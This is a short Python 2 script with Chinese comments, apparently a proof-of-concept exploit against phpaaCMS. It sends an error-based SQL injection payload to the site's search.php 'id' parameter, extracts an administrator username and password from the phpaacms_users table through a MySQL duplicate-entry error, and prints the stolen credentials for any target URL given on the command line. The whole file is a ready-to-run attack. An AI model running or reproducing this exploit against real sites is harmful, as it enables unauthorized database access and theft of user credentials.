#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib2
import sys
import re

 
def verify(url):
    
    headers = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" }   #headers可+可不加

    target = "%s/search.php?id=1" % url

    payload = "+and(select+1+from(select+count(*),concat((select+(select+(SELECT+concat(phpaacms_users.username,0x23,password)+FROM+`phpaa`.phpaacms_users+LIMIT+1,1)+)+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1"

    poc = target + payload

    try:
       
        req = urllib2.Request(poc,headers=headers)

        response = urllib2.urlopen(req)
     
        s = "Duplicate entry \'(.+?)\' for "
   
        if response:

            data = response.read()
            result = re.findall(s,data)
            print("%s 注入成功"%(url))

            result=result[0].split('#')
            print u"账号:%s" % result[0]
            print u"密码:%s" % result[1]

        
    except Exception:
        
        print("%s 注入失败"%(url))



def main():

    args = sys.argv      #sys.argv[]是用来获取命令行参数的，sys.argv[0]表示代码本身文件路径，所以参数从1开始

    if len(args) == 2:
        url = args[1]

        verify(url)
    
    else:
            print "输入要测试的域名或ip：python http://www.xxxx.com"
           
            exit(0)   
    
if __name__ == '__main__':

    main()
